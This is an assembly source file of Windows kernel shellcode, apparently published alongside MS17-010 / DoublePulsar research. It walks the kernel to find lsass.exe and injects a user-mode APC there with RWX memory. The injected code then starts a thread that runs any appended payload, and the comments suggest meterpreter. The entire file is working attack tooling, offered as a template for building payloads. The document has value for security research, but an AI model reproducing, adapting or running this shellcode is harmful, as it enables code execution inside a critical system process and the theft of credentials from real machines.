;
; Windows x86/x64 Multi-Arch Kernel Ring 0 to Ring 3 via Queued APC Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; Release: 04 May 2017
; License: Apache 2.0
; Build: nasm ./kernel.asm
; Acknowledgements: Stephen Fewer, skape, Equation Group, Shadow Brokers
;
; Description:
;   Injects an APC into a specified process. Once in userland, a new thread is
;   created to host the main payload. Add whatever userland payload you want to
;   the end, prepended with two bytes that equal the little endian size of your
;   payload. The userland payload should detect arch if multi-arch is enabled.
;   This payload is convenient, smaller or null-free payloads can be crafted
;   using this as a base template.
;
; References:
;   https://github.com/Risksense-Ops/MS17-010
;   https://msdn.microsoft.com/en-us/library/9z1stfyw.aspx
;   https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
;   https://countercept.com/our-thinking/analyzing-the-doublepulsar-kernel-dll-injection-technique/
;   http://apexesnsyscalls.blogspot.com/2011/09/using-apcs-to-inject-your-dll.html
;

BITS 64
ORG 0

section .text
global payload_start

; options which can be enabled
%define USE_X86                       ; include x86 payload
%define USE_X64                       ; include x64 payload
%define PROCESS_HASH LSASS_EXE_HASH   ; the process to queue APC into
%define MAX_PID 0x10000
; %define CLEAR_DIRECTION_FLAG        ; if cld should be run
; %define SYSCALL_OVERWRITE           ; to run at process IRQL in syscall
; %define ERROR_CHECKS                ; lessen chance of BSOD, but bigger size

; hashes for export directory lookups
LSASS_EXE_HASH                    equ      0x60795e4a   ; hash("lsass.exe")
SPOOLSV_EXE_HASH                  equ      0xdd1f77bf   ; hash("spoolsv.exe")
CREATETHREAD_HASH                 equ      0x221b4546   ; hash("CreateThread")
PSGETCURRENTPROCESS_HASH          equ      0x6211725c   ; hash("PsGetCurrentProcess")
PSLOOKUPPROCESSBYPROCESSID_HASH   equ      0x4ba25566   ; hash("PsLookupProcessByProcessId")
PSGETPROCESSIMAGEFILENAME_HASH    equ      0x2d726fa3   ; hash("PsGetProcessImageFileName")
KEGETCURRENTPROCESS_HASH          equ      0x5e91685c   ; hash("KeGetCurrentProcess")
KEGETCURRENTTHREAD_HASH           equ      0x30a3ba7a   ; hash("KeGetCurrentThread")
KEINITIALIZEAPC_HASH              equ      0x4b55ceac   ; hash("KeInitializeApc")
KEINSERTQUEUEAPC_HASH             equ      0x9e093818   ; hash("KeInsertQueueApc")
KESTACKATTACHPROCESS_HASH         equ      0xdc1124e5   ; hash("KeStackAttachProcess")
KEUNSTACKDETACHPROCESS_HASH       equ      0x7db3b722   ; hash("KeUnstackDetachProcess")
ZWALLOCATEVIRTUALMEMORY_HASH      equ      0xee0aca4b   ; hash("ZwAllocateVirtualMemory")
EXALLOCATEPOOL_HASH               equ      0x9150ac26   ; hash("ExAllocatePool")
OBFDEREFERENCEOBJECT_HASH         equ      0x764dc812   ; hash("ObfDereferenceObject")
KERNEL32_DLL_HASH                 equ      0x92af16da   ; hash_U(L"kernel32.dll", len)

; now the shellcode begins
payload_start:

%ifdef SYSCALL_OVERWRITE
syscall_overwrite:
%endif

x64_kernel_start:
; Some "globals", which should not be clobbered, these are also ABI non-volatile
; ----------------------------------------------
; r15 = ntoskrnl.exe base address (DOS MZ header)
; r14 = &x64_kernel_start
; r13 = PID/PEPROCESS of injected process
; rbp = current rsp

%ifdef CLEAR_DIRECTION_FLAG
  cld
%endif

  ; we will restore non-volatile registers
  push rsi                                          ; save clobbered registers
  push r15                                          ; r15 = ntoskernl.exe
  push r14                                          ; r14 = &x64_kernel_start
  push r13                                          ; r13 = PID/EPROCESS

  push rbp

  mov rbp, rsp                                      ; we'll use the base pointer
  and sp, 0xFFF0                                    ; align stack to ABI boundary
  sub rsp, 0x20                                     ; reserve shadow stack

  lea r14, [rel x64_kernel_start]                   ; for use in pointers

; this stub loads ntoskrnl.exe into r15
x64_find_nt_idt:
  mov r15, qword [gs:0x38]                          ; get IdtBase of KPCR
  mov r15, qword [r15 + 0x4]                        ; get ISR address
  shr r15, 0xc                                      ; strip to page size
  shl r15, 0xc

_x64_find_nt_idt_walk_page:
  sub r15, 0x1000                                   ; walk along page size
  mov rsi, qword [r15]
  cmp si, 0x5a4d                                    ; 'MZ' header
  jne _x64_find_nt_idt_walk_page

; now we need to find the EPROCESS to inject into
x64_find_process_name:
  xor r13d, r13d

_x64_find_process_name_loop_pid:
  mov ecx, r13d
  add ecx, 0x4
%ifdef MAX_PID
  cmp ecx, MAX_PID
  jge kernel_exit
%endif

  mov rdx, r14                                      ; PEPROCESS*
  mov r13d, ecx                                      ; save current PID

  ; PsLookupProcessById(dwPID, &x64_kernel_start);
  mov r11d, PSLOOKUPPROCESSBYPROCESSID_HASH
  call x64_block_api_direct

  test eax, eax                                     ; see if STATUS_SUCCESS
  jnz _x64_find_process_name_loop_pid

  mov rcx, [r14]                                    ; *rcx = *PEPROCESS

  ; PsGetProcessImageFileName(*(&x64_kernel_start));
  mov r11d, PSGETPROCESSIMAGEFILENAME_HASH
  call x64_block_api_direct

  mov rsi, rax
  call x64_calc_hash

  ; mov rcx, r13                                      ; restore dwPID

  cmp r9d, PROCESS_HASH

  jne _x64_find_process_name_loop_pid

x64_attach_process:
  ; mov r13, [r14]                        ; r13 = EPROCESS

  mov rdx, r14                            ; rdx = (PRKAPC_STATE)&x64_kernel_start
  mov rcx, [r14]                          ; rcx = PEPROCESS

  ; KeStackAttachProcess(PEPROCESS, &x64_kernel_start);
  mov r11d, KESTACKATTACHPROCESS_HASH
  call x64_block_api_direct

  mov r13, [r14]                          ; r13 = PRKAPC_STATE

  ; ZwAllocateVirtualMemory
  push 0x40                                   ; PAGE_EXECUTE_READWRITE
  push 0x1000                                 ; AllocationType

  lea r9, [r14 + 8]                           ; r9 = pRegionSize
  mov qword [r9], 0x1000                      ; *pRegionSize = 0x1000

  xor r8, r8                                  ; ZeroBits = 0
  mov rdx, r14                                ; rdx = BaseAddress
  xor ecx, ecx
  mov qword [rdx], rcx                        ; set *BaseAddress = NULL
  not rcx                                     ; rcx = 0xffffffffffffffff

  ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, 0x1000, 0x1000, 0x40);
  mov r11d, ZWALLOCATEVIRTUALMEMORY_HASH
  sub rsp, 0x20                               ; we have to reserve new shadow stack
  call x64_block_api_direct

%ifdef ERROR_CHECKS
  test eax, eax
  jnz kernel_exit
%endif

  ; rep movs kernel -> userland
  mov rdi, [r14]
  lea rsi, [rel userland_start]
  xor ecx, ecx
  add cx, word [rel userland_payload_size]              ; size of payload userland
  add cx, userland_payload - userland_start             ; size of our userland
  rep movsb

;%include "./src/kernel/calc_thread_delta.asm"
  ; Teb loop
  ; ExAllocatePool(POOL_TYPE.NonPagedPool, 0x90);
  xor edx, edx
  add dl, 0x90
  xor ecx, ecx
  mov r11d, EXALLOCATEPOOL_HASH
  call x64_block_api_direct

  mov r12, rax

  mov r11d, KEGETCURRENTTHREAD_HASH
  call x64_block_api_direct

; KeInitializeApc(rcx = apc,
;                 rdx = pThread,
;                 r8 = NULL = OriginalApcEnvironment,
;                 r9 = KernelApcRoutine,
;                 NULL,
;                 InjectionShellCode,
;                 1 /* UserMode */,
;                 NULL /* Context */);
  mov rcx, r12                                ; pool APC
  lea r9, [rcx + 0x80]                        ; dummy kernel APC function
  mov byte [r9], 0xc3                         ; ret

  lea rdx, [rax]                              ; pThread;
  xor r8, r8                                  ; OriginalApcEnvironment = NULL
  push r8                                     ; Context = NULL
  push 0x1                                    ; UserMode
  mov rax, [r14]
  push rax                                    ; userland shellcode
  push r8                                     ; NULL

  sub rsp, 0x20
  mov r11d, KEINITIALIZEAPC_HASH
  call x64_block_api_direct

  ; KeInsertQueueApc(pAPC, NULL, NULL, NULL);
  xor r8, r8
  xor r9, r9
  xor rdx, rdx
  mov rcx, r12

  mov r11d, KEINSERTQUEUEAPC_HASH
  call x64_block_api_direct

  ; KeUnstackDetachProcess(pApcState)
  mov rcx, r13
  mov r11d, KEUNSTACKDETACHPROCESS_HASH
  call x64_block_api_direct

  ; ObfDereferenceObject

kernel_exit:

  mov rsp, rbp

  pop r13
  pop r14
  pop r15
  pop rsi                                           ; restore clobbered registers and return

  pop rbp
  ret

userland_start:

x64_userland_start:

  jmp x64_userland_start_thread

; user and kernel mode re-use this code
x64_calc_hash:
  xor r9, r9

_x64_calc_hash_loop:
  xor eax, eax
  lodsb                                 ; Read in the next byte of the ASCII function name
  ror r9d, 13                           ; Rotate right our hash value
  cmp al, 'a'
  jl _x64_calc_hash_not_lowercase
  sub al, 0x20                          ; If so normalise to uppercase
_x64_calc_hash_not_lowercase:
  add r9d, eax                          ; Add the next byte of the name
  cmp al, ah                            ; Compare AL to AH (\0)
  jne _x64_calc_hash_loop

  ret

x64_block_find_dll:
  xor edx, edx
  mov rdx, [gs:rdx + 96]
  mov rdx, [rdx + 24]         ; PEB->Ldr
  mov rdx, [rdx + 32]         ; InMemoryOrder list

_x64_block_find_dll_next_mod:
  mov rdx, [rdx]
  mov rsi, [rdx + 80]         ; unicode string
  movzx rcx, word [rdx + 74]  ; rcx = len

  xor r9d, r9d

_x64_block_find_dll_loop_mod_name:
  xor eax, eax
  lodsb
  cmp al, 'a'
  jl _x64_block_find_dll_not_lowercase
  sub al, 0x20

_x64_block_find_dll_not_lowercase:
  ror r9d, 13
  add r9d, eax
  loop _x64_block_find_dll_loop_mod_name

  cmp r9d, r11d
  jnz _x64_block_find_dll_next_mod

  mov rax, [rdx + 32]
  ret

x64_block_api_direct:
  mov rax, r15                                        ; make copy of module

  push r9                                             ; Save parameters
  push r8
  push rdx
  push rcx

  mov rdx, rax
  mov eax, dword [rdx+60]                             ; Get PE header e_lfanew
  add rax, rdx
  mov eax, dword [rax+136]                            ; Get export tables RVA

%ifdef ERROR_CHECKS
  ; test rax, rax                                     ; EAT not found
  ; jz _block_api_not_found
%endif

  add rax, rdx
  push rax                                            ; save EAT

  mov ecx, dword [rax+24]                             ; NumberOfFunctions
  mov r8d, dword [rax+32]                             ; FunctionNames
  add r8, rdx

_x64_block_api_direct_get_next_func:
                              ; When we reach the start of the EAT (we search backwards), we hang or crash
  dec rcx                     ; decrement NumberOfFunctions
  mov esi, dword [r8+rcx*4]   ; Get rva of next module name
  add rsi, rdx                ; Add the modules base address

  call x64_calc_hash

  cmp r9d, r11d                             ; Compare the hashes
  jnz _x64_block_api_direct_get_next_func   ; try the next function


_x64_block_api_direct_finish:

  pop rax                     ; restore EAT
  mov r8d, dword [rax+36]
  add r8, rdx                 ; ordinate table virtual address
  mov cx, [r8+2*rcx]          ; desired functions ordinal
  mov r8d, dword [rax+28]     ; Get the function addresses table rva
  add r8, rdx                 ; Add the modules base address
  mov eax, dword [r8+4*rcx]   ; Get the desired functions RVA
  add rax, rdx                ; Add the modules base address to get the functions actual VA

  pop rcx
  pop rdx
  pop r8
  pop r9
  pop r11                     ; pop ret addr

  ; sub rsp, 0x20               ; shadow space
  push r11                    ; push ret addr

  jmp rax


x64_userland_start_thread:
  mov r11d, KERNEL32_DLL_HASH
  call x64_block_find_dll
  mov r15, rax

  xor ecx, ecx

  push rcx
  push rcx

  push rcx                                    ; lpThreadId = NULL
  push rcx                                    ; dwCreationFlags = 0
  pop r9                                      ; lpParameter = NULL
  lea r8, [rel userland_payload]              ; lpStartAddr = &threadstart
  pop rdx                                     ; lpThreadAttributes = NULL

  mov r11d, CREATETHREAD_HASH                 ; hash("CreateThread")
  call x64_block_api_direct                   ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL);
  add rsp, 48                                 ; RSP will be off
  ret

threadstart:
  ; ret

userland_payload_size:
  db 0x00
  db 0x00

userland_payload:
  ; insert userland payload here
  ; such as meterpreter
  ; or reflective dll with the metasploit MZ pre-stub
